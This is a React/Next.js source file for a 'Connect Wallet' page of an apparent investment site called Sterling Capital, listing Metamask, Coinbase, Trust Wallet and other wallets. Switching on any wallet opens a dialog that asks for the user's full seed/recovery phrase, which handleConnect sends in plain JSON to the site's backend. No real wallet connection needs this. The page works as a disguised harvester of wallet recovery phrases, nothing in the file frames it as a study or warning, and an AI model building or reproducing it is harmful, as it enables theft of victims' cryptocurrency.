"use client";

import { useState, useEffect, useCallback } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import DashboardNavbar from "@/components/main/DashboardNavbar";
import { WalletIcons } from "./_components/WalletIcons";
// import { useToast } from "@/hooks/use-toast";
import { toast } from "sonner";
import { BACKEND_URL } from "@/lib/constants";

// Wallet data structure
interface Wallet {
  id: string;
  name: string;
  icon: React.ReactNode;
}

// Wallet response type
interface WalletResponse {
  wallet_type: string;
}

// API base URL - adjust this to your backend URL
const API_BASE_URL = BACKEND_URL;

// Wallet list
const wallets: Wallet[] = [
  {
    id: "aktionariat",
    name: "Aktionariat Wallet",
    icon: <WalletIcons.AktionariatWallet />,
  },
  {
    id: "binance",
    name: "Binance Wallet",
    icon: <WalletIcons.BinanceWallet />,
  },
  {
    id: "bitcoin",
    name: "Bitcoin Wallet",
    icon: <WalletIcons.BitcoinWallet />,
  },
  {
    id: "bitkeep",
    name: "Bitkeep Wallet",
    icon: <WalletIcons.BitkeepWallet />,
  },
  { id: "bitpay", name: "Bitpay", icon: <WalletIcons.Bitpay /> },
  { id: "blockchain", name: "Blockchain", icon: <WalletIcons.Blockchain /> },
  {
    id: "coinbase",
    name: "Coinbase Wallet",
    icon: <WalletIcons.CoinbaseWallet />,
  },
  {
    id: "coinbase-one",
    name: "Coinbase One",
    icon: <WalletIcons.CoinbaseOne />,
  },
  { id: "crypto", name: "Crypto Wallet", icon: <WalletIcons.CryptoWallet /> },
  { id: "exodus", name: "Exodus Wallet", icon: <WalletIcons.ExodusWallet /> },
  { id: "gemini", name: "Gemini", icon: <WalletIcons.Gemini /> },
  { id: "imtoken", name: "Imtoken", icon: <WalletIcons.Imtoken /> },
  {
    id: "infinito",
    name: "Infinito Wallet",
    icon: <WalletIcons.InfinitoWallet />,
  },
  {
    id: "infinity",
    name: "Infinity Wallet",
    icon: <WalletIcons.InfinityWallet />,
  },
  {
    id: "keyringpro",
    name: "Keyringpro Wallet",
    icon: <WalletIcons.KeyringproWallet />,
  },
  { id: "metamask", name: "Metamask", icon: <WalletIcons.Metamask /> },
  { id: "ownbit", name: "Ownbit Wallet", icon: <WalletIcons.OwnbitWallet /> },
  {
    id: "phantom",
    name: "Phantom Wallet",
    icon: <WalletIcons.PhantomWallet />,
  },
  { id: "pulse", name: "Pulse Wallet", icon: <WalletIcons.PulseWallet /> },
  { id: "rainbow", name: "Rainbow", icon: <WalletIcons.Rainbow /> },
  {
    id: "robinhood",
    name: "Robinhood Wallet",
    icon: <WalletIcons.RobinhoodWallet />,
  },
  {
    id: "safepal",
    name: "Safepal Wallet",
    icon: <WalletIcons.SafepalWallet />,
  },
  {
    id: "sparkpoint",
    name: "Sparkpoint Wallet",
    icon: <WalletIcons.SparkpointWallet />,
  },
  { id: "trust", name: "Trust Wallet", icon: <WalletIcons.TrustWallet /> },
  { id: "uniswap", name: "Uniswap", icon: <WalletIcons.Uniswap /> },
  { id: "walletio", name: "Wallet io", icon: <WalletIcons.WalletIo /> },
];

export default function ConnectWalletPage() {
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  const [connectedWallets, setConnectedWallets] = useState<Set<string>>(
    new Set()
  );
  const [seedPhrase, setSeedPhrase] = useState("");
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isLoadingWallets, setIsLoadingWallets] = useState(true);

  // Get auth token from localStorage
  const getAuthToken = () => {
    return localStorage.getItem("authToken");
  };

  // Fetch connected wallets - wrapped in useCallback to fix dependency warning
  const fetchConnectedWallets = useCallback(async () => {
    setIsLoadingWallets(true);
    try {
      const token = getAuthToken();
      if (!token) {
        toast("Authentication Required", {
          description: "Please login to view your wallet connections",
        });
        return;
      }

      const response = await fetch(`${API_BASE_URL}/wallets/`, {
        headers: {
          Authorization: `Token ${token}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        const walletIds = new Set<string>(
          data.wallets.map((w: WalletResponse) => w.wallet_type as string)
        );
        setConnectedWallets(walletIds);
      }
    } catch (error) {
      console.error("Error fetching wallets:", error);

      toast("Error", {
        description: "Failed to load wallet connections",
      });
    } finally {
      setIsLoadingWallets(false);
    }
  }, []); // Empty dependency array since it doesn't depend on any props or state

  // Fetch connected wallets on component mount
  useEffect(() => {
    fetchConnectedWallets();
  }, [fetchConnectedWallets]);

  const handleToggle = (wallet: Wallet, isConnected: boolean) => {
    if (!isConnected) {
      setSelectedWallet(wallet);
      setIsDialogOpen(true);
      setSeedPhrase("");
    } else {
      handleDisconnect(wallet.id);
    }
  };

  const handleConnect = async () => {
    if (!selectedWallet || !seedPhrase.trim()) return;

    setIsLoading(true);
    try {
      const token = getAuthToken();
      if (!token) {
        toast("Authentication Required", {
          description: "Please login to connect wallets",
        });
        return;
      }

      const response = await fetch(`${API_BASE_URL}/wallets/connect/`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Token ${token}`,
        },
        body: JSON.stringify({
          wallet_type: selectedWallet.id,
          wallet_name: selectedWallet.name,
          seed_phrase: seedPhrase,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        setConnectedWallets((prev) => new Set(prev).add(selectedWallet.id));

        toast("Success", {
          description: data.message || "Wallet connected successfully",
        });
        setIsDialogOpen(false);
        setSeedPhrase("");
        setSelectedWallet(null);
      } else {
        toast("Error", {
          description: data.error || "Failed to connect wallet",
        });
      }
    } catch (error) {
      console.error("Error connecting wallet:", error);
      toast("Error", {
        description: "An error occurred while connecting the wallet",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDisconnect = async (walletId: string) => {
    setIsLoading(true);
    try {
      const token = getAuthToken();
      if (!token) {
        toast("Authentication Required", {
          description: "Please login to disconnect wallets",
        });
        return;
      }

      const response = await fetch(
        `${API_BASE_URL}/wallets/${walletId}/disconnect/`,
        {
          method: "DELETE",
          headers: {
            Authorization: `Token ${token}`,
          },
        }
      );

      const data = await response.json();

      if (response.ok && data.success) {
        setConnectedWallets((prev) => {
          const newSet = new Set(prev);
          newSet.delete(walletId);
          return newSet;
        });

        toast("Success", {
          description: data.message || "Wallet disconnected successfully",
        });
      } else {
        toast("Error", {
          description: data.error || "Failed to disconnect wallet",
        });
      }
    } catch (error) {
      console.error("Error disconnecting wallet:", error);

      toast("Error", {
        description: "An error occurred while disconnecting the wallet",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleCloseDialog = () => {
    setIsDialogOpen(false);
    setSeedPhrase("");
    setSelectedWallet(null);
  };

  return (
    <div className="min-h-screen bg-[#1a1d29] dark:bg-white transition-colors">
      <DashboardNavbar />

      {/* Main Content */}
      <main className="container mx-auto px-4 py-20">
        <div className="mb-8">
          <h1 className="text-3xl md:text-4xl font-bold text-white dark:text-gray-900 mb-4">
            Connect Wallet
          </h1>
          <p className="text-gray-300 dark:text-gray-600 text-sm md:text-base max-w-4xl">
            Link your wallet to access premium features. Sterling Capital offers
            support for over 500 exchanges and wallets, NFTs, more than 10,000
            cryptocurrencies, and 20,000 DeFi smart contracts.
          </p>
        </div>

        {/* Loading State */}
        {isLoadingWallets ? (
          <div className="flex items-center justify-center py-12">
            <div className="text-white dark:text-gray-900">
              Loading wallets...
            </div>
          </div>
        ) : (
          /* Wallets Grid */
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {wallets.map((wallet) => {
              const isConnected = connectedWallets.has(wallet.id);
              return (
                <div
                  key={wallet.id}
                  className="flex items-center justify-between p-4 rounded-lg bg-[#23262f] dark:bg-gray-50 border border-gray-700 dark:border-gray-300 hover:border-gray-600 dark:hover:border-gray-400 transition-all"
                >
                  <div className="flex items-center space-x-3">
                    <div className="flex-shrink-0">{wallet.icon}</div>
                    <span className="font-medium text-white dark:text-gray-900 text-sm md:text-base">
                      {wallet.name}
                    </span>
                  </div>
                  <Switch
                    checked={isConnected}
                    onCheckedChange={() => handleToggle(wallet, isConnected)}
                    disabled={isLoading}
                    className="data-[state=checked]:bg-teal-600 dark:data-[state=checked]:bg-teal-500 data-[state=unchecked]:bg-gray-600 dark:data-[state=unchecked]:bg-gray-300"
                  />
                </div>
              );
            })}
          </div>
        )}
      </main>

      {/* Connect Wallet Dialog */}
      <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
        <DialogContent className="sm:max-w-[600px] bg-[#23262f] dark:bg-white border-gray-700 dark:border-gray-300">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-white dark:text-gray-900">
              Connect Wallet
            </DialogTitle>
            <p className="text-sm text-gray-400 dark:text-gray-600 mt-2">
              Connect your wallet to start enjoying your account&apos;s
              additional benefits.
            </p>
          </DialogHeader>

          <div className="space-y-4 mt-4">
            <div>
              <Label className="text-sm font-medium text-white dark:text-gray-900">
                Wallet
              </Label>
              <div className="mt-2 p-3 rounded-md bg-[#1a1d29] dark:bg-gray-100 border border-gray-700 dark:border-gray-300">
                <span className="text-white dark:text-gray-900">
                  {selectedWallet?.name}
                </span>
              </div>
            </div>

            <div>
              <Label
                htmlFor="seed-phrase"
                className="text-sm font-medium text-white dark:text-gray-900"
              >
                Seed/Recovery Phrase:
              </Label>
              <Textarea
                id="seed-phrase"
                placeholder={`Enter your ${selectedWallet?.name} Seed/Recovery Phrase to connect your wallet`}
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                className="mt-2 min-h-[120px] bg-[#1a1d29] dark:bg-white border-gray-600 dark:border-gray-400 text-white dark:text-gray-900 placeholder:text-gray-500 dark:placeholder:text-gray-500 focus:border-teal-500 dark:focus:border-teal-500"
                disabled={isLoading}
              />
            </div>

            <div className="flex flex-col sm:flex-row gap-3 pt-4">
              <Button
                onClick={handleConnect}
                disabled={!seedPhrase.trim() || isLoading}
                className="flex-1 bg-teal-600 hover:bg-teal-700 dark:bg-teal-500 dark:hover:bg-teal-600 text-white disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "Connecting..." : "Connect Wallet"}
              </Button>
              <Button
                onClick={handleCloseDialog}
                variant="outline"
                disabled={isLoading}
                className="flex-1 border-gray-600 dark:border-gray-400 text-gray-300 dark:text-gray-700 hover:bg-[#1a1d29] dark:hover:bg-gray-100"
              >
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
